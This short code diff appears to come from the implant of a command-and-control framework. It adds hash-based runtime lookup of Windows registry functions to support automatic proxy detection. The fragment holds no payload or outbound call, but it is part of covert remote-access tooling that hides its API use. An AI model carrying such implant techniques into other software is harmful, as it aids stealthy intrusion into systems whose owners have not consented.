@@ -54,6 +54,11 @@ BOOL RtAdvapi32(
         Instance->Win32.GetSidSubAuthorityCount      = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITYCOUNT );
         Instance->Win32.GetSidSubAuthority           = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_GETSIDSUBAUTHORITY );
 
+        /* [HVC-026] Registry functions for HttpAutoProxyDetect() */
+        Instance->Win32.RegOpenKeyExW                = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGOPENKEYW );
+        Instance->Win32.RegQueryValueExW             = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGQUERYVALUEEXW );
+        Instance->Win32.RegCloseKey                  = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGCLOSEKEY );
+
         PUTS( "Loaded Advapi32 functions" )
     } else {
         MemZero( ModuleName, sizeof( ModuleName ) );
